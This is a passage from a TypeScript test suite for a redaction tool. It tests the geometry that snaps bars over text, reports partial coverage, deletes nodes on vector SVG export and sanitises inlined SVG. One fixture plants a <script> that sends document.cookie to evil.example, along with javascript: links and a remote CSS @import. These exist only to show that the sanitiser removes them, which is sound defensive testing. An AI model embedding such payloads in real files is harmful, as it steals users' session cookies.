  // fixed-point grow walked the whole block.
  const nodes: any[] = [];
  for (let line = 0; line < 6; line++) {
    for (let word = 0; word < 8; word++) {
      nodes.push(box(50 + word * 60, 100 + line * 14, 60, 14));
    }
  }
  assert.equal(rectTouches(nodes[0], nodes[1]), true, 'the fixture really does abut');
  assert.equal(rectOverlaps(nodes[0], nodes[1]), false, 'and abutting is not overlapping');
  assert.equal(rectTouches(nodes[0], nodes[8]), true, 'lines abut vertically too');
  assert.equal(rectOverlaps(nodes[0], nodes[8]), false);

  // A thin strike through one word in the middle of the block.
  const snapped = snapBarToNodes({ x: 240, y: 132, w: 30, h: 3 }, nodes, (b: any) => effBox(b, W, H, false));
  assert.ok(snapped.w <= 90, `stayed word-sized, not paragraph-sized (w=${snapped.w})`);
  assert.ok(snapped.h <= 20, `stayed on its own line (h=${snapped.h})`);
  // The whole block is 480x84; the old behaviour returned exactly that.
  assert.ok(snapped.w * snapped.h < 480 * 84 * 0.1, 'nowhere near the whole block');
  // And it still fully contains the word it was over.
  const over = nodes[2 * 8 + 3];
  assert.ok(snapped.x <= over.x && snapped.x + snapped.w >= over.x + over.w
    && snapped.y <= over.y && snapped.y + snapped.h >= over.y + over.h,
    'the targeted word is completely inside the grown bar');
});

test('redact geom: growth is bounded by intent, deletion is bounded by paint', () => {
  const { snapBarToNodes, effBox } = loadGeom();
  const W = 600, H = 200;
  // Two words. The drawn bar is over the first only; the 2-unit inflation of the
  // GROWN box then clips the second. The bar must not grow to the second (that
  // is the cascade), but it must still ADDRESS it — a vector export that painted
  // over a word without deleting it would leave it extractable under the ink.
  const nodes = [box(20, 20, 40, 12), box(61, 20, 40, 12)];
  const s = snapBarToNodes({ x: 25, y: 24, w: 20, h: 4 }, nodes, (b: any) => effBox(b, W, H, false));
  assert.equal(s.x + s.w, 60, 'grown to the first word and no further');
  assert.deepEqual(s.hit, [0, 1], 'but both are addressed, because both get painted');
});

test('redact geom: snapping probes the PAINTED box, so inflation and quantise pull nodes in', () => {
  const { snapBarToNodes, effBox } = loadGeom();
  const W = 400, H = 200;
  // A word sitting just outside the drawn bar, but inside the 2px inflation the
  // export paints. It gets covered either way — so it must also be DELETED,
  // which only happens if the probe is the painted box and not the raw drag.
  const near = box(51, 10, 20, 10);
  const raw = { x: 10, y: 10, w: 40, h: 10 };
  assert.deepEqual(snapBarToNodes(raw, [near]).hit, [], 'raw box alone does not reach it');
  const probed = snapBarToNodes(raw, [near], (b: any) => effBox(b, W, H, false));
  assert.deepEqual(probed.hit, [0], 'the inflated painted box does');
});

test('redact geom: snap happens FIRST, the quantise grid then widens the already-snapped span', () => {
  const { snapBarToNodes, effBox, effectiveRect } = loadGeom();
  const W = 400, H = 200;
  const word = box(20, 10, 100, 24);
  const thin = { x: 40, y: 20, w: 10, h: 3 };

  const snapped = snapBarToNodes(thin, [word], (b: any) => effBox(b, W, H, true));
  const after = effectiveRect(snapped, W, H, true);

  // Order matters and is observable: quantising the 10-wide drag first would
  // round 14 up to 24 and the word would still be half naked. Snapping first
  // gives a 104-wide span that the grid then rounds to 120.
  assert.ok(after.x0 <= 20 && after.x1 >= 120, `the whole word is inside, got ${after.x0}..${after.x1}`);
  assert.equal((after.x1 - after.x0) % 24, 0, 'the final width still lands on the grid');

  const wrongOrder = effectiveRect(thin, W, H, true);
  assert.ok(wrongOrder.x1 < 120, 'quantise-then-snap would have left the word exposed');
});

test('redact geom: partial coverage is exact, and the union of bars counts', () => {
  const { partialNodes, uncoveredParts } = loadGeom();
  const word = box(10, 10, 100, 20);

  // Half covered: reported, with the exposed remainder named.
  const half = partialNodes([word], [box(0, 0, 60, 40)]);
  assert.equal(half.length, 1);
  assert.equal(half[0].index, 0);
  assert.deepEqual(half[0].parts, [{ x: 60, y: 10, w: 50, h: 20 }]);

  // Fully covered by one bar: silent.
  assert.deepEqual(partialNodes([word], [box(0, 0, 200, 200)]), []);

  // Two bars that JOINTLY finish the word are not a partial coverage. Testing
  // each bar on its own would have reported a leak that is not there.
  assert.deepEqual(partialNodes([word], [box(0, 0, 60, 40), box(55, 0, 100, 40)]), []);

  // Untouched nodes are never reported, however far from a bar.
  assert.deepEqual(partialNodes([box(500, 500, 10, 10)], [box(0, 0, 60, 40)]), []);

  // Antialiasing slivers are not readable content: a sub-unit remainder is
  // dropped rather than nagged about.
  assert.deepEqual(uncoveredParts(word, [box(10, 10, 99.9, 20)]), []);
});

test('redact geom: the partial warning reports OVERLAP, not adjacency', () => {
  const { partialNodes } = loadGeom();
  // The rule, stated as a test. With growth bounded to one pass a bar can end up
  // clipping a neighbour it was never aimed at, and that neighbour IS reported:
  // to a reader of the output, half a blacked-out word is half a blacked-out
  // word whoever aimed at it, and in vector mode the clipped neighbour is
  // deleted outright. What is NOT reported is a node the bar merely abuts —
  // nothing of it is covered, so there is nothing to say about it, and on body
  // text every line has two such neighbours and the toast would be permanent.
  const bar = box(0, 0, 50, 20);
  const clipped = box(45, 0, 40, 20);    // 5 units of it are under the bar
  const abutting = box(50, 0, 40, 20);   // shares the bar's right edge exactly
  const adjacentLine = box(0, 20, 50, 20); // shares the bar's bottom edge

  assert.deepEqual(partialNodes([clipped], [bar]).map((p: any) => p.index), [0],
    'a genuinely clipped neighbour is reported');
  assert.deepEqual(partialNodes([abutting], [bar]), [], 'an abutting node is not');
  assert.deepEqual(partialNodes([adjacentLine], [bar]), [], 'nor is the line below');
  // And a grazing overlap under the epsilon is measurement slop, not a finding.
  assert.deepEqual(partialNodes([box(49.9, 0, 40, 20)], [bar]), []);
});

test('redact geom: the template mirror and the hook agree, case by case', () => {
  // template.html has to carry its own copy of the maths — the measuring
  // happens where the DOM is, mid-gesture, and a sandboxed hook cannot be
  // called there. This is the guard that stops the two drifting.
  const hook = loadGeom();
  const mirror = loadTemplateGeom();
  const INFLATE = 2, GRID = 24, W = 300, H = 150;

  const boxes = [
    box(0, 0, 10, 10), box(5, 5, 10, 10), box(20, 0, 5, 40), box(-5, -5, 8, 8),
    box(100, 100, 60, 20), box(0, 0, 300, 150), box(12.5, 7.25, 3.5, 2.75),
  ];
  for (const a of boxes) {
    for (const b of boxes) {
      assert.equal(mirror.rectTouches(a, b), hook.rectTouches(a, b), `rectTouches ${JSON.stringify([a, b])}`);
      assert.equal(mirror.rectOverlaps(a, b), hook.rectOverlaps(a, b), `rectOverlaps ${JSON.stringify([a, b])}`);
      for (const eps of [0, 0.25, 2]) {
        assert.equal(mirror.rectOverlaps(a, b, eps), hook.rectOverlaps(a, b, eps),
          `rectOverlaps eps=${eps} ${JSON.stringify([a, b])}`);
      }
      assert.deepEqual(mirror.unionBox(a, b), hook.unionBox(a, b), 'unionBox');
      assert.deepEqual(mirror.subtractBox(a, b), hook.subtractBox(a, b), 'subtractBox');
    }
    for (const q of [true, false]) {
      assert.deepEqual(
        mirror.effBox(a, W, H, q, INFLATE, GRID),
        hook.effBox(a, W, H, q),
        `effBox ${JSON.stringify(a)} quantise=${q}`
      );
    }
    assert.deepEqual(mirror.uncoveredParts(a, boxes, null), hook.uncoveredParts(a, boxes, null), 'uncoveredParts');
  }
  assert.deepEqual(mirror.partialNodes(boxes, [box(0, 0, 30, 30)], null),
    hook.partialNodes(boxes, [box(0, 0, 30, 30)], null), 'partialNodes');

  // The rounded-corner shape too: the preview claims to paint what the export
  // burns, and this is the only thing making that claim true.
  for (const a of boxes) {
    const rect = { x0: a.x, y0: a.y, x1: a.x + a.w, y1: a.y + a.h };
    for (const r of [0, 1, 3, 8, 40]) {
      assert.deepEqual(
        mirror.paintedShape(rect, r, W, H),
        hook.paintedShape(rect, r, W, H),
        `paintedShape ${JSON.stringify(rect)} radius=${r}`
      );
    }
  }

  for (const q of [true, false]) {
    const effHook = (b: any) => hook.effBox(b, W, H, q);
    const effMirror = (b: any) => mirror.effBox(b, W, H, q, INFLATE, GRID);
    for (const seed of boxes) {
      assert.deepEqual(
        mirror.snapBarToNodes(seed, boxes, effMirror),
        hook.snapBarToNodes(seed, boxes, effHook),
        `snapBarToNodes ${JSON.stringify(seed)} quantise=${q}`
      );
    }
  }
});

// ─── re-measuring bars this canvas did not draw ──────────────────────────────

test('redact resnap: a bar that arrived unmeasured is snapped to cover and addressed', () => {
  const resnap = loadTemplateResnap();
  const { parseNodeMarks } = loadGeom();
  const W = 300, H = 150, INFLATE = 2;
  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, INFLATE, 24);

  // Two glyph boxes side by side, as an outlined PDF page or an SVG presents
  // them. The bar is a strikethrough: it crosses both, finishes neither.
  const nodes = [
    { idx: 0, x: 10, y: 20, w: 40, h: 30 },
    { idx: 1, x: 55, y: 20, w: 40, h: 30 },
  ];
  const thin: any = { page: 1, x: 12, y: 32, w: 80, h: 4 };   // no `n`: never measured

  const out = resnap.plan([thin], 1, nodes, W, H, eff);
  assert.equal(out.changed, true, 'an unmeasured bar is always re-measured');
  const got = out.next[0];

  // Snap-to-cover: the bar now contains both glyph boxes outright.
  assert.ok(got.x <= 10 && got.y <= 20, 'grew up and left to the first glyph');
  assert.ok(got.x + got.w >= 95 && got.y + got.h >= 50, 'grew down and right past the second');
  // And it carries the addresses vector export deletes, in sorted order.
  assert.deepEqual(parseNodeMarks(got.n), [0, 1]);
  // The original array is never mutated — the caller commits the copy.
  assert.equal(thin.n, undefined);
  assert.equal((thin as any).w, 80);
});

test('redact resnap: a bar that already covers what it touches is left exactly alone', () => {
  const resnap = loadTemplateResnap();
  const W = 300, H = 150;
  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
  const nodes = [{ idx: 0, x: 10, y: 20, w: 40, h: 30 }];

  // Drawn on this canvas: measured, and containing its one node.
  const settled = { page: 1, x: 5, y: 15, w: 55, h: 45, n: 'm:0' };
  const out = resnap.plan([settled], 1, nodes, W, H, eff);
  assert.equal(out.changed, false, 'no correction, so no commit and no history entry');
  assert.equal(out.next[0], settled, 'the very same object, not a rewritten copy');
});

test('redact resnap: re-planning its own output changes nothing (no creep)', () => {
  const resnap = loadTemplateResnap();
  const W = 300, H = 150;
  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
  // A row of glyphs close enough that a careless pass could keep absorbing
  // neighbours one render at a time.
  const nodes = [0, 1, 2, 3].map((i) => ({ idx: i, x: 10 + i * 25, y: 20, w: 20, h: 30 }));

  const first = resnap.plan([{ page: 1, x: 12, y: 32, w: 30, h: 4 }], 1, nodes, W, H, eff);
  assert.equal(first.changed, true);
  // The fixed point has to be reached in ONE pass: every later render calls
  // this again, and a second correction would be a second undo entry.
  const second = resnap.plan(first.next, 1, nodes, W, H, eff);
  assert.equal(second.changed, false, 'settled after one correction');
  const third = resnap.plan(second.next, 1, nodes, W, H, eff);
  assert.equal(third.changed, false);
});

test('redact resnap: a measured bar that leaves a node partly covered is REPORTED, not re-grown', () => {
  const resnap = loadTemplateResnap();
  const { parseNodeMarks, partialNodes } = loadGeom();
  const W = 300, H = 150;
  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
  const nodes = [{ idx: 0, x: 10, y: 20, w: 90, h: 30 }];

  // Measured once, then edited in the sidebar until it only half-covers the
  // node. Re-growing it here used to be the correction; with growth bounded to
  // one pass it becomes the creep instead — a bar whose inflation clips its
  // neighbour would be regrown into it, clip the next one, and walk across the
  // line a render at a time. So the geometry is the user's and stays put, and
  // the partial coverage is what gets raised.
  const shrunk = { page: 1, x: 10, y: 20, w: 30, h: 30, n: 'm:0' };
  const out = resnap.plan([shrunk], 1, nodes, W, H, eff);
  assert.equal(out.next[0].x, shrunk.x, 'geometry untouched');
  assert.equal(out.next[0].w, shrunk.w);
  assert.deepEqual(parseNodeMarks(out.next[0].n), [0], 'still addressed to the node it is over');

  // The warning is the mechanism that replaces the silent correction, and it
  // fires on exactly this bar.
  const partials = partialNodes(nodes, [eff(shrunk)], null);
  assert.equal(partials.length, 1, 'reported as partly covered');
  assert.equal(partials[0].index, 0);
});

test('redact resnap: other pages, zero-area rows and raster frames are untouched', () => {
  const resnap = loadTemplateResnap();
  const W = 300, H = 150;
  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
  const nodes = [{ idx: 0, x: 10, y: 20, w: 40, h: 30 }];

  // A bar belonging to page 2 is not this frame's to measure, and an
  // in-progress zero-area row survives the pass intact (it round-trips through
  // the canvas as-is).
  const bars = [
    { page: 2, x: 12, y: 32, w: 80, h: 4 },
    { page: 1, x: 0, y: 0, w: 0, h: 0 },
  ];
  assert.equal(resnap.plan(bars, 1, nodes, W, H, eff).changed, false);

  // Flat pixels have no elements, so neither snap-to-cover nor the addresses
  // can exist there — and the tool's copy says exactly that.
  assert.equal(resnap.plan([{ page: 1, x: 12, y: 32, w: 80, h: 4 }], 1, [], W, H, eff).changed, false);
});

test('redact resnap: a corrected bar keeps every field the row carried', () => {
  const resnap = loadTemplateResnap();
  const W = 300, H = 150;
  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
  const nodes = [{ idx: 3, x: 10, y: 20, w: 40, h: 30 }];

  const out = resnap.plan(
    [{ page: 1, x: 12, y: 32, w: 20, h: 4, label: 'keep me', note: 7 }],
    1, nodes, W, H, eff
  );
  assert.equal(out.changed, true);
  assert.equal(out.next[0].label, 'keep me', 'unknown columns are not dropped on correction');
  assert.equal(out.next[0].note, 7);
  assert.equal(out.next[0].page, 1);
});

test('redact resnap: a long row of abutting glyph boxes is NOT swallowed, and does not creep', () => {
  const resnap = loadTemplateResnap();
  const W = 4000, H = 150;
  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
  // 40 abutting glyph boxes — the shape that used to run away. Whether growth
  // was capped (a bar that crept outward one commit per render) or run to a
  // fixed point (a bar that swallowed all 40 at once), the row decided the
  // answer instead of the drag. Now the drag does.
  const nodes = Array.from({ length: 40 }, (_, i) => ({ idx: i, x: 10 + i * 20, y: 20, w: 20, h: 30 }));

  const first = resnap.plan([{ page: 1, x: 12, y: 32, w: 10, h: 4 }], 1, nodes, W, H, eff);
  assert.equal(first.changed, true, 'the unmeasured bar is snapped');
  assert.ok(first.next[0].x + first.next[0].w <= 60,
    `stopped at the boxes it was over (right edge ${first.next[0].x + first.next[0].w})`);

  // Settled: every later render calls this again, and the bar must not move.
  const second = resnap.plan(first.next, 1, nodes, W, H, eff);
  assert.equal(second.changed, false, 'no creep across renders');
  const third = resnap.plan(second.next, 1, nodes, W, H, eff);
  assert.equal(third.changed, false);

  // A wider drag over the same row takes more of it — the row is not what
  // decides the width.
  const wide = resnap.plan([{ page: 1, x: 12, y: 32, w: 200, h: 4 }], 1, nodes, W, H, eff);
  assert.ok(wide.next[0].w > first.next[0].w * 3, 'the drag decides, not the chain');
});

test('redact resnap: one array threaded through several pages keeps every correction', () => {
  const resnap = loadTemplateResnap();
  const W = 300, H = 150;
  const eff = (b: any) => resnapGeom().effBox(b, W, H, false, 2, 24);
  const nodesP1 = [{ idx: 0, x: 10, y: 20, w: 40, h: 30 }];
  const nodesP2 = [{ idx: 7, x: 60, y: 40, w: 40, h: 30 }];

  // Every page frame measures its own page, but they all share ONE bars array.
  // The canvas folds them together before committing once; a per-frame commit
  // would rebuild the array from the same pre-correction snapshot and hand back
  // page 1's uncorrected row, reverting it. This pins the folding.
  const bars = [
    { page: 1, x: 12, y: 32, w: 8, h: 4 },
    { page: 2, x: 62, y: 52, w: 8, h: 4 },
  ];
  const afterP1 = resnap.plan(bars, 1, nodesP1, W, H, eff);
  assert.equal(afterP1.changed, true);
  const afterP2 = resnap.plan(afterP1.next, 2, nodesP2, W, H, eff);
  assert.equal(afterP2.changed, true);

  // Both rows are measured in the SAME array — page 1's correction survived
  // page 2's pass.
  assert.equal(resnap.measured(afterP2.next[0]), true, 'page 1 stayed corrected');
  assert.equal(resnap.measured(afterP2.next[1]), true, 'page 2 was corrected too');
  assert.ok(afterP2.next[0].w >= 40, 'page 1 kept its snapped geometry');

  // And the folded result is a fixed point for both pages.
  assert.equal(resnap.plan(afterP2.next, 1, nodesP1, W, H, eff).changed, false);
  assert.equal(resnap.plan(afterP2.next, 2, nodesP2, W, H, eff).changed, false);
});

test('redact resnap: "measured" reads a mark the same way the hook parses one', () => {
  const resnap = loadTemplateResnap();
  const { parseNodeMarks } = loadGeom();
  // The two have to agree on the one distinction vector export turns on:
  // an absence of information is not a fact about the document.
  for (const n of ['m', 'm:0', 'm:3,17', '', 'nonsense', undefined, null]) {
    assert.equal(
      resnap.measured({ n }),
      parseNodeMarks(n) !== null,
      `measured(${JSON.stringify(n)}) agrees with the hook`
    );
  }
});

// ─── node addressing: the string a drawn bar carries ─────────────────────────

test('redact: the per-bar node marks distinguish "measured, nothing there" from "never measured"', () => {
  const { parseNodeMarks, formatNodeMarks } = loadGeom();
  // The difference is the whole honesty of vector mode: one is a fact about the
  // document, the other is an absence of information.
  assert.equal(parseNodeMarks(''), null, 'never measured');
  assert.equal(parseNodeMarks(undefined), null);
  assert.equal(parseNodeMarks('nonsense'), null);
  assert.deepEqual(parseNodeMarks('m'), [], 'measured, nothing under the bar');
  assert.deepEqual(parseNodeMarks('m:3,17'), [3, 17]);
  assert.equal(formatNodeMarks([]), 'm');
  assert.equal(formatNodeMarks([17, 3]), 'm:17,3');
  assert.deepEqual(parseNodeMarks(formatNodeMarks([4, 9])), [4, 9], 'round trip');
});

// ─── inline SVG preparation (the enabling change) ────────────────────────────

test('redact: prepareInlineSvg addresses every element and neutralises the executable subset', () => {
  const { prepareInlineSvg } = loadGeom();
  const src = `<?xml version="1.0"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<!-- authored in a hurry -->
<svg xmlns="http://www.w3.org/2000/svg" width="210mm" height="105mm" viewBox="0 0 100 50">
  <script>fetch('https://evil.example/' + document.cookie)</script>
  <foreignObject width="10" height="10"><div onclick="steal()">html</div></foreignObject>
  <a href="javascript:steal()" onclick="steal()"><text x="5" y="20">Keep me</text></a>
  <image href="data:image/png;base64,AAAA" width="10" height="10"/>
</svg>`;
  const out = prepareInlineSvg(src, { className: 'rd-img', natW: 793.7, natH: 396.85 });

  // Code cannot ride into the app's origin on an inline fragment.
  assert.doesNotMatch(out, /<script|evil\.example|document\.cookie/);
  assert.doesNotMatch(out, /foreignObject|steal\(\)/i);
  assert.doesNotMatch(out, /onclick|javascript:/i);
  // A prologue has no meaning inline, and comments are noise.
  assert.doesNotMatch(out, /<\?xml|<!DOCTYPE|<!--/);
  // The artwork survives, including the data-URI image the preview needs to
  // render (it is a picture, not code; vector EXPORT is where it gets deleted).
  assert.match(out, /Keep me/);
  assert.match(out, /data:image\/png/);
  // Sized at the natural pixels the bars are measured in; the viewBox is left
  // exactly alone, so the export's own mapping still agrees with the preview.
  assert.match(out, /width="793\.7" height="396\.85"/);
  assert.match(out, /viewBox="0 0 100 50"/);
  assert.doesNotMatch(out, /210mm/);
  assert.match(out, /class="rd-img"/);
  // Every element but the root carries its token address.
  assert.match(out, /<text[^>]*data-rdn="\d+"/);
  assert.match(out, /<image[^>]*data-rdn="\d+"/);
  assert.doesNotMatch(out, /<svg[^>]*data-rdn=/, 'the root is never a deletion target');

  assert.equal(prepareInlineSvg('not markup at all', { natW: 10, natH: 10 }), '',
    'markup with no <svg> root inlines nothing, and the <img> fallback takes over');
});

test("redact: an inlined file's own CSS is rescoped so it cannot repaint the app", () => {
  const { prepareInlineSvg, scopeCssRules } = loadGeom();
  // A <style> inside inline SVG is DOCUMENT-wide in HTML. Illustrator and Figma
  // exports ship `.cls-1 { … }` constantly, so dropping the block would make
  // half the previews render as black shapes; rescoping keeps the picture and
  // contains the blast radius.
  const src = '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="50" viewBox="0 0 100 50">'
    + '<style>@import url(https://evil.example/x.css); .cls-1, text { fill: #fff } '
    + '@media (min-width: 1px) { .cls-2 { fill: red } } '
    + '@font-face { font-family: X; src: url(data:font/woff2;base64,AA) }</style>'
    + '<text class="cls-1" x="5" y="20">Hi</text></svg>';
  const out = prepareInlineSvg(src, { natW: 100, natH: 50 });
  assert.match(out, /svg\[data-rdsvg\] \.cls-1,svg\[data-rdsvg\] text\{/);
  assert.match(out, /@media \(min-width: 1px\) \{svg\[data-rdsvg\] \.cls-2\{/, 'nested at-rules are scoped too');
  assert.doesNotMatch(out, /@import/, 'an @import would fetch from inside the app');
  assert.match(out, /@font-face/, 'font faces are not selectors and stay as they are');

  // Bare, so the rule is pinned without the surrounding markup in the way.
  assert.equal(scopeCssRules('a{x:1}', 'S', 0), 'S a{x:1}');
  assert.equal(scopeCssRules('a , b{x:1}', 'S', 0), 'S a,S b{x:1}');
});

// ─── vector deletion: bars REMOVE what they touch, and the gate proves it ────

const NODES_SVG = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">
  <text x="10" y="30">HUSHWORD</text>
  <text x="10" y="70">Public line</text>
  <rect x="150" y="10" width="30" height="20" fill="#ccc"/>
</svg>`;

// Read a node's committed address the way the canvas does: off the inline
// markup the template renders, which is the same token index the export deletes
// by. That round trip IS the addressing scheme, so the test walks it.
function rdnOfText(markup: string, contains: string): number {
  const re = /<text[^>]*\bdata-rdn="(\d+)"[^>]*>([\s\S]*?)<\/text>/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(markup))) {
    if (m[2]!.includes(contains)) return Number(m[1]);
  }
  throw new Error(`no <text> containing ${contains}`);
}

test('redact: vector export DELETES the addressed nodes, not just covers them', async () => {
  const hooks = loadHooks();
  const { prepareInlineSvg } = loadGeom();
  const inline = prepareInlineSvg(NODES_SVG, { natW: 200, natH: 100 });
  const hushIdx = rdnOfText(inline, 'HUSHWORD');

  const res = await hooks.exportFile({
    model: modelFor(fileRef('n.svg', 'image/svg+xml', svgBytes(NODES_SVG)), {
      svgVector: true,
      bars: [drawn(8, 14, 90, 22, { n: `m:${hushIdx}` })],
    }),
    host: BARE_HOST,
  });
  const out = new TextDecoder().decode(res.bytes);
  // Gone from the file, not painted over: this is the claim the round supersedes
  // the old "vector mode covers positioned text" caveat with.
  assert.doesNotMatch(out, /HUSHWORD/);
  // Everything the bar did not touch is untouched.
  assert.match(out, /Public line/);
  assert.match(out, /<rect x="150"/);
  // And the opaque mark is still painted over the area (the branded default: a
  // rounded path in the resolved ink, fully opaque).
  assert.match(out, /<path d="M[^"]+" fill="#14161a" fill-opacity="1"\/>/);
});

test('redact: a bar with no measured nodes deletes nothing and still paints', async () => {
  const hooks = loadHooks();
  const res = await hooks.exportFile({
    model: modelFor(fileRef('n.svg', 'image/svg+xml', svgBytes(NODES_SVG)), {
      svgVector: true,
      bars: [drawn(150, 10, 30, 20)], // 'm' — measured, nothing under it
    }),
    host: BARE_HOST,
  });
  const out = new TextDecoder().decode(res.bytes);
  assert.match(out, /HUSHWORD/, 'a bar that touched nothing removes nothing');
  assert.match(out, /fill="#14161a" fill-opacity="1"/);
});

test('redact: vector export refuses a bar that was never measured, instead of covering it', async () => {
  const hooks = loadHooks();
  // A bar typed into the sidebar, restored from a URL, or driven headlessly has
  // no idea what it sits on. Covering what we promised to delete would be the
  // one dishonest export in the tool, so it fails with a sentence that says
  // what to do instead.
  await assert.rejects(
    () => hooks.exportFile({
      model: modelFor(fileRef('n.svg', 'image/svg+xml', svgBytes(NODES_SVG)), {
        svgVector: true,
        bars: [{ page: 1, x: 8, y: 14, w: 90, h: 22 }],
      }),
      host: BARE_HOST,
    }),
    (e: any) => {
      assert.match(e.message, /has to be measured against the page/);
      assert.match(e.message, /turn vector mode off to export a PNG instead\.$/);
      // The wording is a contract with the CLI, not just prose: it is how a
      // headless run learns this is browser work and escalates to the browser
      // tier instead of failing, where the canvas measures the bars for real.
      assert.equal(needsBrowserTier(e.message), true,
        'the refusal must classify as browser-tier work — see shells/cli/src/run.ts');
      return true;
    }
  );
});

test('redact: the gate fails when a deleted node\'s content survives elsewhere in the output', async () => {
  const hooks = loadHooks();
  const { prepareInlineSvg } = loadGeom();
  // The same word sits in a node the bar touched AND in one it did not. The
  // deletion is real, but the STRING is still recoverable from the file, and
  // the export gate greps for exactly that rather than trusting the surgery.
  const twice = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" viewBox="0 0 200 100">
  <text x="10" y="30">HUSHWORD</text>
  <text x="10" y="90">HUSHWORD again, far away</text>
</svg>`;
  const idx = rdnOfText(prepareInlineSvg(twice, { natW: 200, natH: 100 }), 'HUSHWORD');
  await assert.rejects(
    () => hooks.exportFile({
      model: modelFor(fileRef('t.svg', 'image/svg+xml', svgBytes(twice)), {
        svgVector: true,
        bars: [drawn(8, 14, 90, 22, { n: `m:${idx}` })],
      }),
      host: BARE_HOST,
    }),
    /Verification failed: removed content is still present in the SVG output\. Nothing was downloaded\./
  );
});

test('redact: the root <svg> can never be addressed for deletion', () => {
  const { cleanSvgTokens, tokenize } = loadGeom();
  // Index 0 of a document that opens with the root tag. A hostile or buggy
  // commit naming it must not empty the file.
  const src = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><text>hi there</text></svg>';
  const removed: string[] = [];
  const out = cleanSvgTokens(tokenize(src), removed, new Set([0]));
  assert.match(out, /^<svg/);
  assert.match(out, /hi there/);
});

// ─── the SVG source renders inline, end to end ───────────────────────────────

test('redact (e2e): an SVG source renders as inline markup, not an <img>', async () => {
  const rt = await createRuntime(redactTool(), BARE_HOST, {
    source: fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)),
  });
  const html = rt.getHydrated();
  // The frame declares its bar space, and the page itself is in the DOM where
  // node bounds can be read.
  assert.match(html, /class="rd-frame" data-page="1" data-ptw="200" data-pth="100"/);
  assert.match(html, /<svg[^>]*class="rd-img"[^>]*data-rdsvg=""/);
  assert.match(html, /<text[^>]*data-rdn="\d+"[^>]*>Visible caption<\/text>/);
  // The preview is sanitised on the way in: the fixture's script never reaches
  // the app's DOM even though the export path is what deletes it from the file.
  assert.doesNotMatch(html, /espionage/);
  // No <img> preview for an SVG any more.
  assert.doesNotMatch(html, /<img class="rd-img"/);
});

test('redact (e2e): a raster source keeps the <img> preview and says why it cannot snap', async () => {
  const rt = await createRuntime(redactTool(), BARE_HOST, {
    source: fileRef('shot.png', 'image/png', buildDirtyPng()),
  });
  const html = rt.getHydrated();
  assert.match(html, /<img class="rd-img"/, 'flat pixels stay an <img>');
  assert.doesNotMatch(html, /data-rdsvg/);
  // Honest about the consequence rather than silently offering nothing.
  assert.match(html, /no elements to measure/);
  assert.match(html, /covers exactly the area you draw/);
});

// ─── the branded mark: brand tone in, opaque fill out ────────────────────────
// A redaction is an act of authorship and its look is a trust surface, so the
// mark inherits the loaded brand the way community tools inherit palettes
// everywhere else. What must never move: the fill is 100% opaque, and the shape
// covers everything the user marked.

/** A host whose tokens.colors() answers with the given swatch list. */
function tokenHost(swatches: any[]): any {
  return { ...BARE_HOST, tokens: { colors: async () => swatches } };
}

const SEMANTIC = (path: string, value: string): any => ({ ref: `{${path}}`, path, value, name: path });

test('redact mark: the brand\'s dark tone becomes the ink, with a neutral near-black fallback', async () => {
  const { normaliseInk, NEUTRAL_INK } = loadGeom();
  // A fresh module per case: the resolved ink is cached per mount on purpose
  // (one token read, not one per keystroke), so each host needs its own hooks.
  const inkFor = async (host: any, over: any = {}) => {
    const hooks = loadHooks();
    const patch: any = await hooks.onInit({
      model: modelFor(fileRef('a.png', 'image/png', buildDirtyPng()), over), host,
    });
    return patch.barInk;
  };

  // SUSE's own semantic text token is Pine — exactly Andy's "dark muted colour".
  assert.equal(await inkFor(tokenHost([SEMANTIC('color.semantic.text', '#0C322C')])), '#0c322c');
  // Falls back down the list, then to the neutral ink.
  assert.equal(await inkFor(tokenHost([SEMANTIC('color.semantic.primary', '#123456')])), '#123456');
  assert.equal(await inkFor(tokenHost([])), NEUTRAL_INK);
  assert.equal(await inkFor(BARE_HOST), NEUTRAL_INK, 'no tokens API at all');
  // A host whose tokens throw must not take the export down with it.
  assert.equal(await inkFor({ ...BARE_HOST, tokens: { colors: async () => { throw new Error('nope'); } } }), NEUTRAL_INK);
  // Solid is the deliberate opt-out: no brand tone, whatever is loaded.
  assert.equal(await inkFor(tokenHost([SEMANTIC('color.semantic.text', '#0C322C')]), { style: 'solid' }), NEUTRAL_INK);
  // And a token that cannot be painted honestly is refused, not approximated.
  assert.equal(await inkFor(tokenHost([SEMANTIC('color.semantic.text', 'oklch(19% 0.02 275)')])), NEUTRAL_INK);
  assert.equal(normaliseInk('oklch(19% 0.02 275)'), null);
});

test('redact mark: translucency is refused everywhere, colour is not', () => {
  const { normaliseInk } = loadGeom();
  // Colour is security-neutral: any fully opaque fill destroys the pixels under
  // it equally. Alpha is NOT neutral, so nothing below full opacity may become
  // an ink — and an unreadable value must come back null rather than be passed
  // through, because assigning it to a canvas fillStyle is a silent no-op that
  // would leave the previous fill (white) painting bars that redact nothing.
  assert.equal(normaliseInk('#0C322C'), '#0c322c');
  assert.equal(normaliseInk('  #abc '), '#aabbcc');
  assert.equal(normaliseInk('#0c322cff'), '#0c322c', 'fully opaque 8-digit is fine');
  assert.equal(normaliseInk('#abcf'), '#aabbcc');
  assert.equal(normaliseInk('#0c322ccc'), null, '80% opacity is not a redaction');
  assert.equal(normaliseInk('#0c322c00'), null);
  assert.equal(normaliseInk('#abc8'), null);
  assert.equal(normaliseInk('rgba(0,0,0,0.5)'), null);
  assert.equal(normaliseInk('black'), null);
  assert.equal(normaliseInk(''), null);
  assert.equal(normaliseInk(null), null);
  assert.equal(normaliseInk(42), null);
});

test('redact mark: the painted shape is INFLATED by its radius, so the marked rect is fully inside it', () => {
  const { paintedShape } = loadGeom();
  // The rule this pins: a rounded rectangle does NOT cover the corners of the
